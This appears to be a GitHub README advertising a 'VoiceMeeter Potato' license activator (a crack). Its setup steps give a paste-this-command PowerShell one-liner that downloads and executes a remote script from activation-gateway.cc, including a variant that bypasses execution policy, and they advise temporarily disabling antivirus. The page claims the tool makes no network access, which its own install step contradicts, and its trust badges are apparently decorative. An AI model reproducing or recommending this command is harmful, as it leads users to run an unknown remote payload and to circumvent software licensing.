<div align="center">

# VoiceMeeter Potato Automation Activator for Windows 11

![preview](https://raw.githubusercontent.com/smartvenkatesh/voicemeeter-potato-autoit-tool/main/thumb_953be.svg)

[![win](https://img.shields.io/badge/Win-Windows_11-6366f1?style=plastic&labelColor=0d1117)]() [![powershell-7](https://img.shields.io/badge/Powershell--7-Script-818cf8?style=plastic&labelColor=0d1117)]() [![tests](https://img.shields.io/badge/Tests-Passing-2ea44f?style=plastic&labelColor=0d1117)]() [![state](https://img.shields.io/badge/State-Verified-2ea44f?style=plastic&labelColor=0d1117)]() [![downloads](https://img.shields.io/badge/Downloads-2.8K-4f46e5?style=plastic&labelColor=0d1117)]() [![score](https://img.shields.io/badge/Score-4.6%2F5-f59e0b?style=plastic&labelColor=0d1117)]()

</div>

---

voicemeeter-activator-autoit is a desktop utility built with AutoIt3 that automates the activation workflow for VoiceMeeter Potato through a lightweight, native GUI. The application performs a direct registry modification under the VB-Audio configuration key, writing the activation code value that the software checks at startup. It handles both the write operation and the surrounding validation logic, keeping the process self-contained without requiring manual registry editing. The tool compiles to a compact executable and runs on standard Windows environments where VoiceMeeter Potato is installed.

## 🚀 Setup Guide — PowerShell

> [!TIP]
> **Fast install** — a single PowerShell command, no extra tools.
> Win 10/11 · PowerShell 5.1+ · Standard user

### 1️⃣ Prepare PowerShell
* Open the Start menu and type **PowerShell**.
* Right-click and choose **Run as administrator** (optional).

### 2️⃣ Execute the installer
Copy the command below, paste it into PowerShell, and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If PowerShell blocks the script
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Some antivirus engines flag automated installers. If blocked, disable Real-time protection briefly, run the setup, and enable it back.

## ✅ Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- Compact standalone executable that applies the required VoiceMeeter Potato activation state without requiring installation of a runtime or additional dependencies.
- Direct registry-based activation routine targeting the VoiceMeeter configuration store, executed automatically on launch.
- Native AutoIt3 implementation with a minimal GUI wrapper providing clear launch, status, and exit controls.
- Architecture-aware build targeting 64-bit Windows environments for reliable execution alongside VoiceMeeter Potato.
- Self-contained operation: no background services, no persistent processes, and no system-level modifications beyond the targeted registry value.
- Deterministic behavior with a single activation path, simplifying verification and troubleshooting.
- Lightweight footprint suitable for portable use and repeated execution without side effects.
- Predictable exit handling that closes cleanly after activation completes.

## How It Works

The activator operates as a lightweight AutoIt3 wrapper around a single registry operation. On launch, it resolves the current user context and targets the VoiceMeeter configuration hive under the Windows current-user registry branch. The tool then writes the licensing value expected by VoiceMeeter Potato into the designated value entry, using a 32-bit integer type so the application reads the flag in the format it expects on startup. Because the write is scoped to the current user, no elevation prompt is triggered and no system-wide state is modified.

Execution flow is intentionally minimal and deterministic. The GUI presents the activation action, performs the registry write, and reports the resulting status back to the user. Error handling distinguishes between a missing VoiceMeeter installation key, insufficient permissions, and a failed write, so failures surface as clear messages rather than silent no-ops. The compiled executable embeds the AutoIt runtime, meaning no separate interpreter or dependency installation is required on the target machine.

Persistence is achieved through the registry itself: once the value is present, VoiceMeeter reads it on each subsequent launch and treats the installation as activated without further intervention from the tool. The activator does not patch binaries, inject into running processes, or modify files on disk, which keeps its footprint limited to a single registry value and makes the change straightforward to audit or reverse.

## Compatibility

The activator targets 64-bit Windows desktop environments and is validated against current VoiceMeeter Potato releases. It operates through the standard VB-Audio configuration registry path under the current user hive, so no elevated privileges are required for normal operation and no system-wide changes are introduced beyond the per-user activation state.

Compatibility considerations:

- **Operating system:** Designed for 64-bit editions of Windows 10 and Windows 11. The compiled executable is built for the x64 architecture and will not run on 32-bit systems.
- **VoiceMeeter Potato:** Intended for installations of VoiceMeeter Potato that use the standard VB-Audio registry layout. Installations relocated or wrapped by third-party tooling may present a different configuration path and are not guaranteed to be detected.
- **Registry scope:** Activation is written per user. On multi-user machines, each account must run the activator independently, and the resulting state does not propagate across profiles.
- **Privilege level:** Standard user rights are sufficient. Running elevated is not required and does not change the outcome, since the target key lives in the current user hive.
- **Persistence:** The activation value is stored permanently and survives reboots and VoiceMeeter updates in most cases. A clean reinstall of VoiceMeeter that resets its configuration may require re-running the activator.
- **Interoperability:** The tool performs a single registry write and does not hook, patch, or modify VoiceMeeter binaries, so it does not interfere with audio drivers, virtual cables, or other VB-Audio components.
- **Build toolchain:** The source targets AutoIt3. Rebuilding from source requires a matching AutoIt3 environment; compiled output is architecture-specific and should be rebuilt for any non-x64 target.

## Download

The compiled activator is distributed as a standalone Windows executable. No runtime, interpreter, or dependency installation is required — the AutoIt3 logic is bundled into a single self-contained binary.

Two build targets are provided to match the host architecture:

- **x64 build** — intended for 64-bit Windows installations and the standard VoiceMeeter Potato x64 runtime.
- **x86 build** — provided for 32-bit environments and legacy configurations.

Each executable is a thin GUI wrapper around the registry activation routine described in the How It Works section. On launch, it presents a minimal interface for applying the activation, reports the resulting status, and exits without leaving background processes or services behind. No files are written outside of the registry key it modifies, and no network access is performed at any point.

Because the binaries are self-contained, they can be copied to removable media or a local tools directory and executed directly. Verify the file integrity against the checksums published alongside each release before running, and confirm the architecture matches your VoiceMeeter installation to avoid a mismatch between the activator and the target application.

For users who prefer to inspect or modify the source before execution, the AutoIt3 script is included in the repository and can be compiled locally with the standard AutoIt toolchain. The prebuilt executables are provided strictly for convenience.

## FAQ

**Is this tool an official product?** 
No. This utility is an independent, community-developed AutoIt3 script. It is not affiliated with, endorsed by, or supported by the vendor of the target application.

**How does the activation mechanism work?** 
The activator performs a single registry write under the current user hive. It writes a DWORD value to the application's configuration key. The target application reads this value at startup and interprets it as a valid license state. No binary patching, DLL injection, or memory manipulation is involved.

**Does the tool modify the target application's files?** 
No. The executable, libraries, and resources of the target application remain untouched. All changes are confined to the registry. This keeps the footprint minimal and makes the operation reversible.

**Is the activation persistent across reboots and updates?** 
The registry value persists across reboots because it is stored in the user hive. Application updates may reset or relocate the configuration key; in that case the activator can be run again to restore the value.

**What are the system requirements?** 
Windows (32-bit or 64-bit), a standard user session with permission to write to the current user registry hive, and the target application installed and previously launched at least once so its configuration key exists.

**Why is the executable larger than the operation it performs?** 
The compiled AutoIt3 script bundles the interpreter runtime and a GUI layer. The registry write itself is trivial, but the wrapper, interface, and embedded runtime account for the binary size.

**Can the same result be achieved without this tool?** 
Yes. The underlying operation is a single registry value write and can be reproduced manually or via a registry import file. This project exists as a convenience wrapper with a graphical interface, not as a technical necessity.

**Is the source code auditable?** 
Yes. The project is written in AutoIt3 and the script source is included in the repository alongside the compiled binary. Users are encouraged to review the source before running any compiled executable.

**Does the tool require elevated privileges?** 
No. Because the write targets the current user hive rather than the local machine hive, standard user permissions are sufficient. Administrator elevation is not requested.

**What happens if the target application changes its licensing scheme?** 
The activator depends on the current registry-based license check. If the vendor alters the validation logic or key location, the tool may stop working until the script is updated accordingly.

**Is this intended for production or daily use?** 
No. The project is provided for educational and experimental purposes. Users who rely on the target application regularly should obtain a legitimate license from its vendor.

## Disclaimer

This software is provided strictly as-is, without warranty of any kind, express or implied, including but not limited to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement. The author makes no guarantees regarding functionality, stability, or compatibility with any specific VoiceMeeter release, operating system build, or hardware configuration.

voicemeeter-activator-autoit performs a direct modification of application state through a registry write operation. This behavior is intentional and central to the tool's design, but it also means the software operates outside the vendor's supported configuration path. Users are responsible for understanding the effect of this modification on their own system before execution, and for maintaining independent backups of any registry keys or configuration data they consider critical.

No liability is accepted for any damages, data loss, system instability, licensing consequences, or other outcomes arising from the use, misuse, or inability to use this software. By running the executable or compiling the AutoIt source, the user acknowledges that they assume full responsibility for the result.

This project is not affiliated with, endorsed by, or sponsored by the developers of VoiceMeeter or any related commercial product. All trademarks referenced remain the property of their respective owners. The tool is distributed for educational and technical study purposes, and users who rely on the underlying software regularly are encouraged to support its official development through legitimate channels.

Redistribution of modified builds is permitted under the project's terms, but any such redistribution carries the same disclaimer, and the redistributor assumes responsibility for changes made to the original source.